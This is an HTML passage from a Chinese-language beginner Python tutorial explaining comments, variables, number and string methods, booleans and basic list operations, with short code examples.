<p>0x09 python 中的注释:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">单行注释 <span class="comment"># 要注释的内容</span></span><br><span class="line">多行注释,单双引号均可,在python中单双引号作用完全相同,不存在强弱引用之别,跟其它语言稍有差别</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">   要注释内容...</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">""" </span></span><br><span class="line"><span class="string">   要注释内容...</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">python 语句结束不需要分号,代码块对应关系全部以缩进来区分,格式要求很严格,非常规整</span><br></pre></td></tr></table></figure></p>
<p>0x10 到底什么叫声明变量:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">就是一段存在指定内存地址上的数据,根据变量名可以快速找到这段数据,仅此而已</span><br></pre></td></tr></table></figure></p>
<p>0x11 在python中声明变量及变量命名规则须知 [和其它语言并无差别]:</p>
<p>变量名 必须由大小写字母,下划线,数字组成,但不能以数字开头,另外,禁止使用python各种内置关键字作为变量名,如下,<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username = <span class="string">"klion"</span></span><br><span class="line">password = <span class="string">"admin"</span></span><br><span class="line">username_new = username 支持变量直接再赋给变量 </span><br><span class="line">del username 		手动销毁变量,其实python内部也会自动回收没有指向的内存空间,又名垃圾回收机制</span><br></pre></td></tr></table></figure></p>
<p>0x12 熟练掌握 python中的一些基本数据类型,因为python本身是纯面向对象的,所以每种数据类型对应的其实就是一个类,把某个值赋给某个变量的过程其实就相当于根据这个数据类型所对应的类创建一个对象:</p>
<p>1] 数字类型,关键字 int , 注意,在python3.x中对于数字型并没有长度限制,python2.x 有长度限制</p>
<p>熟练使用数字类型的一些常用方法:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">int</span><span class="params">()</span></span></span><br><span class="line">把一个字符串强制转换成一个数字,前提是要转换的这个字符串必须全部是由纯数字组成</span><br><span class="line"> </span><br><span class="line">num = int(<span class="string">"1234"</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(type(num)</span></span>)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span>(<span class="built_in">num</span>,base=<span class="number">2</span>)</span><br><span class="line">把<span class="built_in">num</span>字符串按照指定的进制数转换成十进制,<span class="number">2</span>表示二进制,<span class="number">8</span>表示八进制,<span class="number">16</span>表示<span class="number">16</span>进制,默认是转<span class="number">10</span>进制的</span><br><span class="line"></span><br><span class="line"><span class="built_in">num</span> = <span class="string">"0011"</span></span><br><span class="line">res = <span class="built_in">int</span>(<span class="built_in">num</span>,base=<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bit_length 输出指定数字所占的有效二进制位数,</span><br><span class="line"></span><br><span class="line"><span class="built_in">num</span> = <span class="built_in">int</span>(<span class="string">"3"</span>)</span><br><span class="line">res = <span class="built_in">num</span>.bit_length()</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__add__ 比较简单,就是将两个数相加</span><br><span class="line"></span><br><span class="line">num = int(<span class="string">"3"</span>)</span><br><span class="line">num1 = 34</span><br><span class="line">res = num.__add__(num1)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<p>2] 字符串类型,关键字 str<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">定义一个字符串:</span><br><span class="line">单引号 <span class="string">'str'</span></span><br><span class="line">双引号 <span class="string">"str"</span></span><br><span class="line">三引号 <span class="string">""" str """</span> 跟注释的区别就在于有没有变量接收,没有接收就是注释,有接收就是字符串变量</span><br><span class="line">字符串连接符 <span class="string">' + '</span></span><br></pre></td></tr></table></figure></p>
<p>熟练使用字符串的一些常用内置方法:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">len</span><span class="params">()</span></span> 	统计字符串或者列表[以逗号分割]长度</span><br><span class="line">str_info = <span class="string">"Hello klIon ^_^! hEllo KittY"</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(len(str_info)</span></span>)</span><br></pre></td></tr></table></figure></p>
<p>通过字符串索引 取值,切片<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str_info = <span class="string">"Hello klIon ^_^! hEllo KittY"</span></span><br><span class="line"></span><br><span class="line">print(str_info[<span class="number">0</span>])		取第一个字符</span><br><span class="line">print(str_info[<span class="number">2</span>:<span class="number">6</span>])		取第三个到第<span class="number">7</span>个字符,大于等于<span class="number">2</span>小于<span class="number">6</span></span><br><span class="line">print(str_info[<span class="number">9</span>:<span class="number">-1</span>])		取第<span class="number">10</span>个到倒数第一个之间的所有字符</span><br><span class="line">print(str_info[<span class="number">12</span>:<span class="number">-2</span>])		取第<span class="number">13</span>个到倒数第二个之间的所有字符</span><br></pre></td></tr></table></figure></p>
<p>循环取出字符串中所有的字符及其对应的索引<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">str_info = <span class="string">"Hello klIon ^_^! hEllo KittY"</span></span><br><span class="line">print(len(str_info))</span><br><span class="line">iterm = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> iterm &lt; len(str_info):</span><br><span class="line">	print(iterm,<span class="string">"=&gt;"</span>,str_info[iterm])</span><br><span class="line">	iterm += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> iterm <span class="keyword">in</span> str_info:</span><br><span class="line">	print(iterm)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"分隔符"</span>.<span class="keyword">join</span>(要拆分拼接的字符串)    </span><br><span class="line">将指定的字符串按照指定的分割符进行拼接,返回一个新字符串</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"hello linux"</span></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"*"</span>.<span class="keyword">join</span>(str_info))</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">split</span><span class="params">(<span class="string">'分隔符'</span>,分割次数)</span></span>  </span><br><span class="line">按照指定字符和分割次数进行分割,默认是从左到右分割,分割后返回一个的新列表,注意,分隔符本身并不包含在内</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"this is a test demo code ! thanks "</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.split(<span class="string">'t'</span>,<span class="number">2</span>)</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">rsplit</span><span class="params">(<span class="string">'分隔符'</span>,分割次数)</span></span>  </span><br><span class="line">指定字符分割和分割次数,从右到做开始分割,同样返回一个新列表</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"this is a test demo code ! thanks "</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.rsplit(<span class="string">'t'</span>,<span class="number">2</span>)</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">partition</span><span class="params">(<span class="string">'指定要切割的字符'</span>)</span></span>  </span><br><span class="line">以指定的字符进行切割,不同于split的是,它只切割一次,也就是说当遇到第一个要切割的字符就是开始切割</span><br><span class="line">后面再遇到该字符就不再切割了,返回一个切割后的元祖,默认是从左到右进行切割的</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"hello klion ^_^! hello kitty"</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.partition(<span class="string">'l'</span>)</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">rpartition</span><span class="params">(<span class="string">'指定要切割的字符'</span>)</span></span> 以指定的字符进行分割,从右往左开始</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">splitlines</span><span class="params">([False/True])</span></span>以换行符进行分割,返回一个新列表,如果加上True则保留\n,否则则不保留</span><br><span class="line">str_info = <span class="string">"this is a test \ndemo code ! thanks "</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.splitlines()</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">replace</span><span class="params">(<span class="string">'要替换的内容[旧]'</span>,<span class="string">'要替换成的内容[新]'</span>,要替换的次数[默认替换所有])</span></span> </span><br><span class="line">把旧字符串替换成新字符串,默认是从左到右进行替换的,返回一个替换后的新字符串</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"welcome to klion "</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.replace(<span class="string">'klion'</span>,<span class="string">'linux'</span>,<span class="number">1</span>)</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">find</span><span class="params">(<span class="string">'字符序列'</span>,字符串索引起始位置,字符串索引结束位置)</span></span> </span><br><span class="line">寻找指定的子序列在目标字符串中是否存在,默认是按照从左往右的顺序查找,查到则返回对应字符序列在目标字符串中的索引位置,查不到则返回-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"welcome to klion,klion is a pentester! "</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.find(<span class="string">'sec'</span>,<span class="number">0</span>,<span class="number">100</span>)</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">rfind</span><span class="params">(<span class="string">'字符序列'</span>,字符串索引起始位置,字符串索引结束位置)</span></span>  和find不同的是,find默认是从左开始查找的,而rfind是从右开始查找的</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">strip</span><span class="params">(指定要剔除的字符[应该是遍历循环剔除的,只要匹配到其中任意一个字符就剔掉])</span></span></span><br><span class="line">默认是剔除指定字符串两边的空白符[空格],亦可指定要剔除的指定字符,返回一个新的字符串</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"***welcome to klion,klion is wa pentester!***w"</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.strip(<span class="string">'w**'</span>)</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">lstrip</span><span class="params">(指定要剔除的字符)</span></span>  </span><br><span class="line">默认是剔除指定字符串左侧的空白符,亦可指定要剔除的指定字符,返回一个新的字符串</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"***welcome to klion,klion is wa pentester!***w"</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.lstrip(<span class="string">'w**'</span>)</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">rstrip</span><span class="params">(指定要剔除的字符)</span></span>  </span><br><span class="line">默认是剔除右边的空白符,亦可指定要剔除的指定字符,返回一个新的字符串</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"***welcome to klion,klion is wa pentester!***w"</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.rstrip(<span class="string">'w**'</span>)</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">upper</span><span class="params">()</span></span>  把指定字符串全部转换成大写,返回一个新的字符串</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"***welcome to klion,klion is wa pentester!***w"</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.upper()</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">isupper</span><span class="params">()</span></span> 判断目标字符串是否全部为大写,全部为大写则返回True,否则返回False</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"***welcome to klion,klion is wa pentester!***w"</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.isupper()</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">lower</span><span class="params">()</span></span>  把指定字符串全部转换为小写,返回一个新的字符串</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"***welcome to klion,klion is wa pentester!***w"</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.lower()</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">islower</span><span class="params">()</span></span> 判断目标字符串是否全部为小写,全部为小写则返回True,否则返回False</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"***welcome to klion,klion is wa pentester!***w"</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.islower()</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">casefold</span><span class="params">()</span></span>将目标字符串全部转换成小写,会返回一个新的字符串,常用</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"Hello klIon ^_^! hEllo Kitty"</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.casefold()</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">count</span><span class="params">(<span class="string">'字符序列'</span>,目标字符串起始索引位置,目标字符串结束索引位置)</span></span></span><br><span class="line">统计某个字符序列在目标字符串中出现的次数,返回总共匹配到次数</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"welcome to klion,klion is a pentester! "</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.count(<span class="string">'klion'</span>,<span class="number">0</span>,<span class="number">100</span>)</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">isdecimal</span><span class="params">()</span></span> 检查目标字符串是否为十进制字符[其实就是指整数],是则返回True,反之,则返回False,实际中用的较多</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"3"</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.isdecimal()</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">isnumeric</span><span class="params">()</span></span> 检查目标字符串是否为纯数字,用法同上,是则返回True,否则返回False</span><br><span class="line"><span class="function"><span class="title">isalnum</span><span class="params">()</span></span> 检查目标字符串是否为纯数字或字母组成,是则返回True,否则返回False</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">isspace</span><span class="params">()</span></span> 检查目标字符串是否为空格,是则返回True,否则返回False</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">" "</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.isspace()</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">isalpha</span><span class="params">()</span></span> 目标字符串是否为纯字母,是则返回True,否则返回False</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"pentester"</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.isalpha()</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">isprintable检查目标字符串中是否存在不可见字符,如tab,空格<span class="built_in">..</span>.,是则返回<span class="literal">True</span>,否则返回<span class="literal">False</span></span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"hello klion ^_^!"</span></span><br><span class="line"><span class="builtin-name">print</span>(str_info.isprintable())</span><br></pre></td></tr></table></figure>
<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用于接收的变量[pattern] = maketrans(<span class="string">'要替换的内容'</span>,<span class="string">'替换成的内容'</span>) 有点儿类似linux中的tee命令,需要配合<span class="built_in">translate</span>()一起使用</span><br><span class="line"><span class="built_in">translate</span>(pattern) </span><br><span class="line"></span><br><span class="line">pattern = maketrans(<span class="string">'A-XY-Za-xy-z'</span>, <span class="string">'C-ZA-Bc-za-b'</span>)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">"this is a convert....la!!!"</span>;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>.<span class="built_in">translate</span>(trantab))</span><br></pre></td></tr></table></figure>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">title把目标字符串转换成标题样式,返回一个新的字符串</span><br><span class="line">istitle 判断目标字符串是否为标题格式 [标题的每个单词首字母一般都会大写],是则返回True,否则返回False</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"hello klion ^_^!"</span></span><br><span class="line">t_res= str_info.title()</span><br><span class="line">print(t_res.istitle())</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">ljust</span><span class="params">(要填充到的长度,用来填充的字符)</span></span>   字符串填充,从右边开始填充</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"hello klion ^_^!"</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.ljust(<span class="number">30</span>,<span class="string">'#'</span>)</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">rjust</span><span class="params">(要填充的长度,用来填充的字符)</span></span>   字符串填充,从右边开始填充</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"hello klion ^_^!"</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.rjust(<span class="number">30</span>,<span class="string">'#'</span>)</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">center</span><span class="params">(要填充到的长度,<span class="string">"要填充的内容"</span>)</span></span> </span><br><span class="line">填充居中,返回一个新字符串</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"hello klion ^_^!"</span></span><br><span class="line">res = str_info.center(<span class="number">30</span>,<span class="string">"#"</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(res)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">capitalize</span><span class="params">()</span></span>  让整条语句首字母大写</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"hello klion ^_^! hello kitty"</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.capitalize()</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">endswith</span><span class="params">()</span></span> 判断目标字符串是否以指定字符结尾</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"Hello klIon ^_^! hEllo KittY"</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.endswith(<span class="string">'Y'</span>,<span class="number">21</span>)</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">startswith</span><span class="params">()</span></span> 判断目标字符串是否以指定字符开头</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"Hello klIon ^_^! hEllo KittY"</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_info.startswith(<span class="string">'H'</span>,<span class="number">0</span>)</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">expandtabs(<span class="number">32</span>) 把tab键替换成指定个数的空格,例如,下面可以直接利用此方法输出成表格的形式</span><br><span class="line"></span><br><span class="line">str_info = <span class="string">"name:sec<span class="subst">\t</span>mail:sec@sec.org<span class="subst">\t</span>age:23<span class="subst">\n</span>name:sec<span class="subst">\t</span>mail:sec@sec.org<span class="subst">\t</span>age:23<span class="subst">\n</span>name:sec<span class="subst">\t</span>mail:sec@sec.org<span class="subst">\t</span>age:23<span class="subst">\n</span>"</span></span><br><span class="line">print(str_info.expandtabs(<span class="number">32</span>))</span><br></pre></td></tr></table></figure>
<p>布尔类型,关键字 Bool [务必注意开头要大写]<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">True</span> <span class="string">(真),1</span></span><br><span class="line"><span class="literal">False</span><span class="string">(假),0</span></span><br></pre></td></tr></table></figure></p>
<p>为真的情况就不说了,只说为假的情况,如下:<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">None</span></span><br><span class="line"><span class="string">""</span>  空字符串</span><br><span class="line">()  空元祖</span><br><span class="line">[]  空列表</span><br><span class="line">&#123;&#125;空字典</span><br></pre></td></tr></table></figure></p>
<p>3] 列表 list,以’[]’表示,以英文逗号对列表中的每个元素进行分割,列表中的元素可以是任意数据类型,并支持随意的增删改查及in操作,列表是有序的<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">li</span> = list()  创建空列表</span><br><span class="line"><span class="attr">list_info</span> = [<span class="string">'klion'</span>,<span class="string">'25'</span>,<span class="string">'sec@sec. org'</span>,<span class="string">'hello '</span>,<span class="string">'5324213'</span>,<span class="string">'num'</span>,<span class="string">'pentester'</span>,<span class="string">'kali'</span>]</span><br><span class="line"><span class="attr">list_tmp</span>  = [<span class="string">'num'</span>,<span class="number">23</span>]</span><br></pre></td></tr></table></figure></p>
<p>依然是通过 索引,切片取值,跟字符串用法基本是一样的,切完以后会返回一个新列表<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="name">list_info</span>[<span class="number">3</span><span class="symbol">:-1</span>])</span><br></pre></td></tr></table></figure></p>
<p>for循环取出列表中的所有元素<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(list_info))# <span class="built_in">len</span>() 方法用来统计列表元素个数</span><br><span class="line"><span class="keyword">for</span> iterm <span class="keyword">in</span> list_info:</span><br><span class="line">	<span class="built_in">print</span>(iterm)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">index</span><span class="params">(<span class="string">'目标列表中的某个元素值'</span>,起始索引位置,结束索引位置)</span></span>返回某个元素在目标列表中的索引数值</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(list_info.index(<span class="string">'pentester'</span>)</span></span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">insert</span><span class="params">(指定要插入到的索引位置,<span class="string">'要插入的内容'</span>)</span></span>往原有列表中插入新数据,会直接改变原有列表</span><br><span class="line">res = list_info.insert(<span class="number">5</span>,<span class="string">'security'</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(list_info)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(res)</span></span></span><br></pre></td></tr></table></figure>
